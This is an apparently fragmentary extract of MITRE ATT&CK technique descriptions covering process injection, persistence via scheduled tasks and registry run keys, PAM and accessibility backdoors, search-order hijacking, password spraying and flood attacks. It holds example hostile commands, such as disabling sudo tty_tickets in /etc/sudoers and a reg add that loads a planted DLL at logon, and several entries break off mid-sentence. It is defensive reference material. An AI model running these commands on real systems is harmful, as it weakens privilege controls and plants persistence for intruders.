    name: Extra Window Memory Injection
    description: "Adversaries may inject malicious code into process via Extra Window\
      \ Memory (EWM) in order to evade process-based defenses as well as possibly\
      \ elevate privileges. EWM injection is a method of executing arbitrary code\
      \ in the address space of a separate live process. \n\nBefore creating a window,\
      \ graphical Windows-based processes must prescribe to or register a windows\
      \ class, which stipulate appearance and behavior (via windows procedures, which\
      \ are functions that handle input/output of data).(Citation: Microsoft Window\
      \ Classes) Registration of new windows classes can include a request for up\
      \ to 40 bytes of EWM to be appended to the allocated memory of each instance\
      \ of that class. This EWM is intended to store data specific to that window\
      \ and has specific application programming interface (API) functions to set\
      \ and get its value. (Citation: Microsoft GetWindowLong function) (Citation:\
      \ Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough\
      \ to store a 32-bit pointer and is often used to point to a windows procedure.\
      \ Malware may possibly utilize this memory location in part of an attack chain\
      \ that includes writing code to shared sections of the process\u2019s memory,\
      \ placing a pointer to the code in EWM, then invoking execution by returning\
      \ execution control to the address in the process\u2019s EWM.\n\nExecution granted\
      \ through EWM injection may allow access to both the target process's memory\
      \ and possibly elevated privileges. Writing payloads to shared sections also\
      \ avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code>\
      \ and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July\
      \ 2017) More sophisticated malware samples may also potentially bypass protection\
      \ mechanisms such as data execution prevention (DEP) by triggering a combination\
      \ of windows procedures and other system functions that will rewrite the malicious\
      \ payload inside an executable portion of the target process.  (Citation: MalwareTech\
      \ Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\
      \nRunning code in the context of another process may allow access to the process's\
      \ memory, system/network resources, and possibly elevated privileges. Execution\
      \ via EWM injection may also evade detection from security products since the\
      \ execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/011"

    name: Scheduled Task
    description: 'Adversaries may abuse the Windows Task Scheduler to perform task
      scheduling for initial or recurring execution of malicious code. There are multiple
      ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
      utility can be run directly on the command line, or the Task Scheduler can be
      opened through the GUI within the Administrator Tools section of the Control
      Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
      wrapper for the Windows Task Scheduler, and alternatively, adversaries have
      used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
      Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create
      a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)


      An adversary may use Windows Task Scheduler to execute programs at system startup
      or on a scheduled basis for persistence. The Windows Task Scheduler can also
      be abused to conduct remote Execution as part of Lateral Movement and/or to
      run a process under the context of a specified account (such as SYSTEM). Similar
      to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused the Windows Task Scheduler to potentially mask
      one-time execution under signed/trusted system processes.(Citation: ProofPoint
      Serpent)


      Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564))
      that may not be visible to defender tools and manual queries used to enumerate

    description: 'Adversaries may attach filters to a network socket to monitor then
      activate backdoors used for persistence or command and control. With elevated
      permissions, adversaries can use features such as the `libpcap` library to open
      sockets and install filters to allow or disallow certain types of data to come
      through the socket. The filter may apply to all traffic passing through the
      specified network interface (or every interface if not specified). When the
      network interface receives a packet matching the filter criteria, additional
      actions can be triggered on the host, such as activation of a reverse shell.


      To establish a connection, an adversary sends a crafted packet to the targeted
      host that matches the installed filter criteria.(Citation: haking9 libpcap network
      sniffing) Adversaries have used these socket filters to trigger the installation
      of implants, conduct ping backs, and to invoke command shells. Communication
      with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation:
      exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May
      2020)


      Filters can be installed on any Unix-like platform with `libpcap` installed
      or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with
      `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER`
      options. Since the socket connection is not active until the packet is received,
      this behavior may be difficult to detect due to the lack of activity on a host,
      low CPU overhead, and limited visibility into raw socket usage.

      PAM is a modular system of configuration files, libraries, and executable files
      which guide authentication for many services. The most common authentication
      module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account

      Adversaries may modify components of the PAM system to create backdoors. PAM
      components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary
      adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)


      Malicious modifications to the PAM system may also be abused to steal credentials.
      Adversaries may infect PAM resources with code to harvest user credentials,
      since the values exchanged with PAM components may be plain-text since PAM does
      not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)

      guess login credentials without prior knowledge of system or environment passwords
      during an operation by using a list of common passwords. Password guessing may
      or may not take into account the target''s policies on password complexity or
      use policies that may lock accounts out after a number of failed attempts.


      Guessing passwords can be a risky option because it could cause numerous authentication
      failures and account lockouts, depending on the organization''s login failure
      policies. (Citation: Cylance Cleaver)


      Typically, management services over commonly used ports are used when guessing
      passwords. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)

      * SNMP (161/UDP and 162/TCP/UDP)


      In addition to management services, adversaries may "target single sign-on (SSO)
      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:

      by excessive demands on its capacity. These attacks do not need to exhaust the
      actual resources on a system; the attacks may simply exhaust the limits and
      available resources that an OS self-imposes.


      Different ways to achieve this exist, including TCP state-exhaustion attacks
      such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)
      With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP
      handshake is never completed. Because each OS has a maximum number of concurrent
      TCP connections that it will allow, this can quickly exhaust the ability of
      the system to receive new requests for TCP connections, thus preventing access
      to any TCP service provided by the server.(Citation: Cloudflare SynFlood)


      ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK
      packets are sent to the target. This forces the OS to search its state table
      for a related TCP connection that has already been established. Because the
      ACK packets are for connections that do not exist, the OS will have to search
      the entire state table to confirm that no match exists. When it is necessary
      to do this for a large flood of packets, the computational requirements can
      cause the server to become sluggish and/or unresponsive, due to the work it
      must do to eliminate the rogue ACK packets. This greatly reduces the resources
      available for providing the targeted service.(Citation: Corero SYN-ACKflood)

    description: 'Adversaries may perform sudo caching and/or use the sudoers file
      to elevate privileges. Adversaries may do this to execute commands as other
      users or spawn processes with higher privileges.


      Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do")
      allows users to perform commands from terminals with elevated privileges and
      to control who can perform these commands on the system. The <code>sudo</code>
      command "allows a system administrator to delegate authority to give certain
      users (or groups of users) the ability to run some (or all) commands as root
      or another user while providing an audit trail of the commands and their arguments."(Citation:
      sudo man page 2018) Since sudo was made for the system administrator, it has
      some useful configuration features such as a <code>timestamp_timeout</code>,
      which is the amount of time in minutes between instances of <code>sudo</code>
      before it will re-prompt for a password. This is because <code>sudo</code> has
      the ability to cache credentials for a period of time. Sudo creates (or touches)
      a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run
      to determine this timeout. Additionally, there is a <code>tty_tickets</code>
      variable that treats each new tty (terminal session) in isolation. This means
      that, for example, the sudo timeout of one tty will not affect another tty (you
      will have to type the password again).


      The sudoers file, <code>/etc/sudoers</code>, describes which users can run which
      commands and from which terminals. This also describes which commands users
      can run as other users or groups. This provides the principle of least privilege
      such that users are running in their lowest possible permissions for most of
      the time and only elevate to other users or permissions as needed, typically
      by prompting for a password. However, the sudoers file can also specify when
      to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD:
      ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit
      this file though.


      Adversaries can also abuse poor configurations of these mechanisms to escalate
      privileges without needing the user''s password. For example, <code>/var/db/sudo</code>''s
      timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code>
      range. If it does, then malware can execute sudo commands without needing to
      supply the user''s password. Additional, if <code>tty_tickets</code> is disabled,
      adversaries can do this from any tty for that user.


      In the wild, malware has disabled <code>tty_tickets</code> to potentially make
      scripting easier by issuing <code>echo \''Defaults !tty_tickets\'' >> /etc/sudoers</code>.(Citation:
      cybereason osx proton) In order for this change to be reflected, the malware
      also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file
      has <code>tty_tickets</code> enabled by default.

      The simplest, "single-flux" method, involves registering and de-registering
      an addresses as part of the DNS A (address) record list for a single DNS name.
      These registrations have a five-minute average lifespan, resulting in a constant
      shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)


      In contrast, the "double-flux" method registers and de-registers an address
      as part of the DNS Name Server record list for the DNS zone, providing additional
      resilience for the connection. With double-flux additional hosts can act as
      a proxy to the C2 host, further insulating the true source of the C2 channel.

    name: DLL Search Order Hijacking
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the search order used to load DLLs. Windows systems use a common method to look
      for required DLLs to load into a program. (Citation: Microsoft Dynamic Link
      Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads
      may be for the purpose of establishing persistence as well as elevating privileges
      and/or evading restrictions on file execution.


      There are many ways an adversary can hijack DLL loads. Adversaries may plant
      trojan dynamic-link library files (DLLs) in a directory that will be searched
      before the location of a legitimate library that will be requested by a program,
      causing Windows to load their malicious library when it is called for by the
      victim program. Adversaries may also perform DLL preloading, also called binary
      planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL
      with the same name as an ambiguously specified DLL in a location that Windows
      searches before the legitimate DLL. Often this location is the current working
      directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading
      attacks occur when a program sets its current directory to a remote location
      such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory
      2269637)


      Phantom DLL hijacking is a specific type of DLL search order hijacking where
      adversaries target references to non-existent DLL files.(Citation: Hexacorn
      DLL Hijacking)(Citation: Adversaries Hijack DLLs) They may be able to load their
      own malicious DLL by planting it with the correct name in the location of the
      missing module.


      Adversaries may also directly modify the search order via DLL redirection, which
      after being enabled (in the Registry and creation of a redirection file) may
      cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library
      Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order
      Hijacking)


      If a search order-vulnerable program is configured to run at a higher privilege
      level, then the adversary-controlled DLL that is loaded will also be executed
      at the higher level. In this case, the technique could be used for privilege
      escalation from user to administrator or SYSTEM or from administrator to SYSTEM,
      depending on the program. Programs that fall victim to path hijacking may appear
      to behave normally because malicious DLLs may be configured to also load the
      legitimate DLLs they were meant to replace.

      Network sniffing refers to using the network interface on a system to monitor
      or capture information sent over a wired or wireless connection. An adversary
      may place a network interface into promiscuous mode to passively access data
      in transit over the network, or use span ports to capture a larger amount of
      data.


      Data captured via this technique may include user credentials, especially those
      sent over an insecure, unencrypted protocol. Techniques for name service resolution
      poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001),
      can also be used to capture credentials to websites, proxies, and internal systems
      by redirecting traffic to an adversary.


      Network sniffing may reveal configuration details, such as running services,
      version numbers, and other network characteristics (e.g. IP addresses, hostnames,
      VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008)
      and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities.
      Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      (AiTM) to passively gain additional knowledge about the environment.


      In cloud-based environments, adversaries may still be able to use traffic mirroring
      services to sniff network traffic from virtual machines. For example, AWS Traffic
      Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified
      instances to collect traffic from and specified targets to send collected traffic
      to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation:
      Azure Virtual Network TAP) Often, much of this traffic will be in cleartext
      due to the use of TLS termination at the load balancer level to reduce the strain
      of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC
      Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary
      can then use exfiltration techniques such as Transfer Data to Cloud Account
      in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC

      By manipulating runtime data, adversaries may attempt to affect a business process,
      organizational understanding, and decision making.


      Adversaries may alter application binaries used to display data in order to
      cause runtime manipulations. Adversaries may also conduct [Change Default File

      to cause a similar effect. The type of modification and the impact it will have
      depends on the target application and process as well as the goals and objectives
      of the adversary. For complex systems, an adversary would likely need special
      expertise and possibly access to specialized software related to the system
      that would typically be gained through a prolonged information gathering campaign

      for the client and server to agree on an encryption algorithm to use for subsequent
      secure connections. If SSL renegotiation is enabled, a request can be made for
      renegotiation of the crypto algorithm. In a renegotiation attack, the adversary
      establishes a SSL/TLS connection and then proceeds to make a series of renegotiation
      requests. Because the cryptographic renegotiation has a meaningful cost in computation

    description: 'Adversaries may use traffic signaling to hide open ports or other

      signaling involves the use of a magic value or sequence that must be sent to
      a system to trigger a special response, such as opening a closed port or executing
      a malicious task. This may take the form of sending a series of packets with
      certain characteristics before a port will be opened that the adversary can
      use for command and control. Usually this series of packets consists of attempted
      connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)),
      but can involve unusual flags, specific strings, or other unique characteristics.
      After the sequence is completed, opening a port may be accomplished by the host-based
      firewall, but could also be implemented by custom software.


      Adversaries may also communicate with an already open port, but the service
      listening on that port will only respond to commands or trigger other malicious
      functionality if passed the appropriate magic value(s).


      The observation of the signal packets to trigger the communication can be conducted
      through different methods. One means, originally implemented by Cd00r (Citation:
      Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets
      in question. Another method leverages raw sockets, which enables the malware
      to use ports that are already open for use by other programs.


      On network devices, adversaries may use crafted packets to enable [Network Device
      Authentication](https://attack.mitre.org/techniques/T1556/004) for standard
      services offered by the device such as telnet.  Such signaling may also be used
      to open a closed service port such as telnet, or to trigger module modification
      of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries
      may use crafted packets to attempt to connect to one or more (open or closed)
      ports, but may also attempt to connect to a router interface, broadcast, and
      network address IP on the same port in order to achieve their goals and objectives.(Citation:
      Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco

      Wake-on-LAN is a hardware feature that allows a powered down system to be powered

      functionality in browser software to change content, modify user-behaviors,
      and intercept information as part of various browser session hijacking techniques.(Citation:
      Wikipedia Man in the Browser)


      A specific example is when an adversary injects software into a browser that
      allows them to inherit cookies, HTTP sessions, and SSL client certificates of
      a user then use the browser as a way to pivot into an authenticated intranet.(Citation:
      Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based
      behaviors such as pivoting may require specific process permissions, such as
      <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.


      Another example involves pivoting browser traffic from the adversary''s browser
      through the user''s browser by setting up a proxy which will redirect web traffic.
      This does not alter the user''s traffic in any way, and the proxy connection
      can be severed as soon as the browser is closed. The adversary assumes the security
      context of whichever browser process the proxy is injected into. Browsers typically
      create a new process for each tab that is opened and permissions and certificates
      are separated accordingly. With these permissions, an adversary could potentially
      browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002)
      or webmail, that is accessible through the browser and which the browser has
      sufficient permissions. Browser pivoting may also bypass security provided by
      2-factor authentication.(Citation: cobaltstrike manual)

    description: 'Adversaries may execute their own malicious payloads by hijacking
      the search order used to load other programs. Because some programs do not call
      other programs using the full path, adversaries may place their own file in
      the directory where the calling program is located, causing the operating system
      to launch their malicious software at the request of the calling program.


      Search order hijacking occurs when an adversary abuses the order in which Windows
      searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001),
      the search order differs depending on the method that is used to execute the
      program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell)
      (Citation: Microsoft WinExec) However, it is common for Windows to search in
      the directory of the initiating program before searching through the Windows
      system directory. An adversary who finds a program vulnerable to search order
      hijacking (i.e., a program that does not specify the path to an executable)
      may take advantage of this vulnerability by creating a program named after the
      improperly specified program and placing it within the initiating program''s
      directory.


      For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net
      user</code>. An adversary may place a program called "net.exe" within the same
      directory as example.exe, "net.exe" will be run instead of the Windows system
      utility net. In addition, if an adversary places a program called "net.com"
      in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will
      execute "net.com" instead of "net.exe" due to the order of executable extensions
      defined under PATHEXT. (Citation: Microsoft Environment Property)


      Search order hijacking is also a common practice for hijacking DLL loads and
      is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).

      Cloud service providers often provide infrastructure throughout the world in

      A variation on this behavior takes advantage of differences in functionality

      to interact with remote machines by taking advantage of Distributed Component
      Object Model (DCOM). The adversary may then perform actions as the logged-on
      user.


      The Windows Component Object Model (COM) is a component of the native Windows
      application programming interface (API) that enables interaction between software
      objects, or executable code that implements one or more interfaces. Through
      COM, a client object can call methods of server objects, which are typically
      Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is
      transparent middleware that extends the functionality of COM beyond a local
      computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting
      COM June 2019)(Citation: Microsoft COM)


      Permissions to interact with local and remote server COM objects are specified
      by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide
      Com Keys) By default, only Administrators may remotely activate and launch COM
      objects through DCOM.(Citation: Microsoft COM ACL)


      Through DCOM, adversaries operating in the context of an appropriately privileged
      user can remotely obtain arbitrary and even direct shellcode execution through
      Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017)
      as well as other Windows objects that contain insecure methods.(Citation: Enigma
      MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can
      also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017)
      and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002)
      (DDE) execution directly through a COM created instance of a Microsoft Office
      application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing
      the need for a malicious document. DCOM can be used as a method of remotely
      interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).

    description: 'Adversaries may use a single or small list of commonly used passwords
      against many different accounts to attempt to acquire valid account credentials.
      Password spraying uses one password (e.g. ''Password01''), or a small list of
      commonly used passwords, that may match the complexity policy of the domain.
      Logins are attempted with that password against many different accounts on a
      network to avoid account lockouts that would normally occur when brute forcing
      a single account with many passwords. (Citation: BlackHillsInfosec Password
      Spraying)


      Typically, management services over commonly used ports are used when password
      spraying. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)


      In addition to management services, adversaries may "target single sign-on (SSO)
      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:
      US-CERT TA18-068A 2018)


      In default environments, LDAP and Kerberos connection attempts are less likely
      to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

      ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries
      use these types of proxies to manage command and control communications, to
      provide resiliency in the face of connection loss, or to ride over existing
      trusted communications paths to avoid suspicion.


      External connection proxies are used to mask the destination of C2 traffic and
      are typically implemented with port redirectors. Compromised systems outside
      of the victim environment may be used for these purposes, as well as purchased
      infrastructure such as cloud-based resources or virtual private servers. Proxies
      may be chosen based on the low likelihood that a connection to them from a compromised
      system would be investigated. Victim systems would communicate directly with
      the external proxy on the Internet and then the proxy would forward communications
      to the C2 server.

      \ just-in-time access to roles, impersonate other accounts, pass roles onto\
      \ resources and services, or otherwise gain short-term access to a set of privileges\
      \ that may be distinct from their own. \n\nJust-in-time access is a mechanism\
      \ for granting additional roles to cloud accounts in a granular, temporary manner.\
      \ This allows accounts to operate with only the permissions they need on a daily\
      \ basis, and to request additional permissions as necessary. Sometimes just-in-time\
      \ access requests are configured to require manual approval, while other times\
      \ the desired permissions are automatically granted.(Citation: Azure Just in\
      \ Time Access 2023)\n\nAccount impersonation allows user or service accounts\
      \ to temporarily act with the permissions of another account. For example, in\
      \ GCP users with the `iam.serviceAccountTokenCreator` role can create temporary\
      \ access tokens or sign arbitrary payloads with the permissions of a service\

      \ be able to take advantage of the role's access -- for example, by configuring\
      \ the resource to perform certain actions with the permissions it has been granted.\
      \ In AWS, users with the `PassRole` permission can allow a service they create\
      \ to assume a given role, while in GCP, users with the `iam.serviceAccountUser`\
      \ role can attach a service account to a resource.(Citation: AWS PassRole)(Citation:\
      \ Google Cloud Service Account Authentication Roles)\n\nWhile users require\
      \ specific role assignments in order to use any of these features, cloud administrators\
      \ may misconfigure permissions. This could result in escalation paths that allow\

      \ and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\xE4\

      \ TxF transaction using a legitimate executable then overwrite the file with\

      \ executable, effectively removing malicious code from the file system.\n* Animate\
      \ \u2013 Create a process from the tainted section of memory and initiate execution.\n\
      \nThis behavior will likely not result in elevated privileges since the injected\
      \ process was spawned from (and thus inherits the security context) of the injecting\

    name: Executable Installer File Permissions Weakness
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the binaries used by an installer. These processes may automatically execute
      specific binaries as part of their functionality or to perform other actions.
      If the permissions on the file system directory containing a target binary,
      or permissions on the binary itself, are improperly set, then the target binary
      may be overwritten with another binary using user-level permissions and executed
      by the original process. If the original process and thread are running under
      a higher permissions level, then the replaced binary will also execute under
      higher-level permissions, which could include SYSTEM.


      Another variation of this technique can be performed by taking advantage of
      a weakness that is common in executable, self-extracting installers. During
      the installation process, it is common for installers to use a subdirectory
      within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs,
      or other payloads. When installers create subdirectories and files they often
      do not set appropriate permissions to restrict write access, which allows for
      execution of untrusted code placed in the subdirectories or overwriting of binaries
      used in the installation process. This behavior is related to and may take advantage
      of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).


      Adversaries may use this technique to replace legitimate binaries with malicious
      ones as a means of executing code at a higher permissions level. Some installers
      may also require elevated privileges that will result in privilege escalation
      when executing adversary controlled code. This behavior is related to [Bypass
      User Account Control](https://attack.mitre.org/techniques/T1548/002). Several
      examples of this weakness in existing common installers have been reported to
      software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers
      are Vulnerable) If the executing process is set to run at a specific time or
      during a certain event (e.g., system bootup) then this technique can also be
      used for persistence.

      contains accessibility features that may be launched with a key combination
      before a user has logged in (ex: when the user is on the Windows logon screen).
      An adversary can modify the way these programs are launched to get a command
      prompt or backdoor without logging in to the system.


      Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>,
      launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>,
      launched when the Windows + U key combination is pressed. The sethc.exe program
      is often referred to as "sticky keys", and has been used by adversaries for
      unauthenticated access through a remote desktop login screen. (Citation: FireEye
      Hikit Rootkit)


      Depending on the version of Windows, an adversary may take advantage of these
      features in different ways. Common methods used by adversaries include replacing
      accessibility feature binaries or pointers/references to these binaries in the
      Registry. In newer versions of Windows, the replaced binary needs to be digitally
      signed for x64 systems, the binary must reside in <code>%systemdir%\</code>,
      and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation:
      DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012)
      debugger method was likely discovered as a potential workaround because it does
      not require the corresponding accessibility feature binary to be replaced.


      For simple binary replacement on Windows XP and later as well as and Windows
      Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>)
      may be replaced with "cmd.exe" (or another program that provides backdoor access).
      Subsequently, pressing the appropriate key combination at the login screen while
      sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)
      will cause the replaced file to be executed with SYSTEM privileges. (Citation:

    description: "Adversaries may inject malicious code into processes via the asynchronous\

      \ the thread enters an alterable state.(Citation: Microsoft APC) A handle to\
      \ an existing victim process is first created with native Windows API calls\
      \ such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can\
      \ be used to invoke a function (such as <code>LoadLibrayA</code> pointing to\
      \ a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\"\

      \ and executed before the process' entry point (and potentially subsequent anti-malware\
      \ hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation:\

      \ code (perhaps without a file on disk) into the virtual address space of the\

      \ with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,\
      \ then invoked with <code>CreateRemoteThread</code> or additional code (ex:\
      \ shellcode). The displacement of the injected code does introduce the additional\
      \ requirement for functionality to remap memory references. (Citation: Elastic\
      \ Process Injection July 2017) \n\nRunning code in the context of another process\

      Popular websites and social media acting as a mechanism for C2 may give a significant
      amount of cover due to the likelihood that hosts within a network are already
      communicating with them prior to a compromise. Using common services, such as
      those offered by Google or Twitter, makes it easier for adversaries to hide
      in expected noise. Web service providers commonly use SSL/TLS encryption, giving

      be executed when a user logs in.(Citation: Microsoft Run Key) These programs
      will be executed under the context of the user and will have the account''s
      associated permissions level.


      The following run keys are created by default on Windows systems:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>


      Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation:
      Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>
      is also available but is not created by default on Windows Vista and newer.
      Registry run key entries can reference programs directly or list them as a dependency.(Citation:
      Microsoft Run Key) For example, it is possible to load a DLL at logon using
      a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
      /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)


      Placing a program within a startup folder will also cause that program to execute
      when a user logs in. There is a startup folder location for individual user
      accounts as well as a system-wide startup folder that will be checked regardless
      of which user account logs in. The startup folder path for the current user
      is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>.
      The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start
      Menu\Programs\StartUp</code>.


      The following Registry keys can be used to set startup folder items for persistence:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>


      The following Registry keys can control automatic startup of services during
      boot:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>


      Using policy settings to specify startup programs creates corresponding values
      in either of two Registry keys:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>


      Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows
      NT\CurrentVersion\Windows</code> run automatically for the currently logged-on
      user.


      By default, the multistring <code>BootExecute</code> value of the registry key
      <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code>
      is set to <code>autocheck autochk *</code>. This value causes Windows, at startup,
      to check the file-system integrity of the hard disks if the system has been
      shut down abnormally. Adversaries can add other programs or processes to this
      registry value which will automatically launch at boot.


      Adversaries can use these configuration locations to execute malware, such as
      remote access tools, to maintain persistence through system reboots. Adversaries
      may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make

      An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code>
      by replacing an original callback function with a malicious payload. Modifying

      A pointer to the memory address of the <code>KernelCallbackTable</code> can
      be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code>
      [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation:
